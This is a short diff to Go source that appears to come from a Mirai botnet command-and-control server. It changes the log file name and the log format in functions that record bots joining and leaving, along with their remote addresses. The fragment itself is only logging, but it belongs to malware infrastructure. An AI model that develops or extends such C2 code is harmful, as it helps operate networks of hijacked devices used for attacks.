@@ -53,33 +53,35 @@ func (this *ClientList) Distribution() map[string]int {
 func (this *ClientList) AddClient(c *Bot) {
     currentTimeAdd := time.Now()
     formattedTimeAdd := currentTimeAdd.Format("2006-01-02 15:04:05")
+    formattedTimeAddF := currentTimeAdd.Format("2006-01-02\t15:04:05")
     botCountAdd := this.Count()
     this.addQueue <- c
 
-    file, err := os.OpenFile("cncLog4mirai-1017-imBack.txt",os.O_APPEND|os.O_CREATE|os.O_WRONLY,0644)
+    file, err := os.OpenFile("cncLog4mirai-240516_2.txt",os.O_APPEND|os.O_CREATE|os.O_WRONLY,0644)
     if err != nil{
         fmt.Println("Error opening file:",err)
         return
     }
     defer file.Close()
-    fmt.Fprintf(file, "%s\t%d\tAdd\t%s\n",formattedTimeAdd,botCountAdd, c.conn.RemoteAddr())
+    fmt.Fprintf(file, "%s\t%d\tMirai\tAdd\t%s\n",formattedTimeAddF,botCountAdd, c.conn.RemoteAddr())
     
-    fmt.Printf("%s num-%d Add     client %d - %s - %s\n",formattedTimeAdd,botCountAdd, c.version, c.source, c.conn.RemoteAddr())
+    fmt.Printf("%s num-%d Added   client %d - %s - %s\n",formattedTimeAdd,botCountAdd, c.version, c.source, c.conn.RemoteAddr())
 }
 
 func (this *ClientList) DelClient(c *Bot) {
     currentTimeDel := time.Now()
     formattedTimeDel := currentTimeDel.Format("2006-01-02 15:04:05")
+    formattedTimeDelF := currentTimeDel.Format("2006-01-02\t15:04:05")
     botCountDel := this.Count()
     this.delQueue <- c
 
-    file, err := os.OpenFile("cncLog4mirai-1017-imBack.txt",os.O_APPEND|os.O_CREATE|os.O_WRONLY,0644)
+    file, err := os.OpenFile("cncLog4mirai-240516_2.txt",os.O_APPEND|os.O_CREATE|os.O_WRONLY,0644)
     if err != nil{
         fmt.Println("Error opening file:",err)
         return
     }
     defer file.Close()
-    fmt.Fprintf(file, "%s\t%d\tDel\t%s\n",formattedTimeDel,botCountDel, c.conn.RemoteAddr())
+    fmt.Fprintf(file, "%s\t%d\tMirai\tDel\t%s\n",formattedTimeDelF,botCountDel, c.conn.RemoteAddr())
     
     fmt.Printf("%s num-%d Deleted client %d - %s - %s\n",formattedTimeDel,botCountDel, c.version, c.source, c.conn.RemoteAddr())
 }
